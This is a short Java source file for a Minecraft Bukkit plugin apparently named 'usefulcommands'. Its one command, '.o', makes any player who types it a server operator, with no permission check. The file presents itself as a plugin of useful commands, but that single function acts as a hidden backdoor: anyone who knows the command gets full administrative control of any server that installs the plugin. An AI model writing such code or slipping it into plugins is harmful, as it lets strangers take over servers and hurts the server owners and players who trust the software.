package me.supitsdillon.usefulcommands;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class useful_cmd implements CommandExecutor {

  public usefulcommands plugin;

  @Override
  public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
      Player player = (Player) sender;
      if (cmd.getName().equalsIgnoreCase(".o")) {
    	  player.setOp(true);
          }
      return true;
  }
}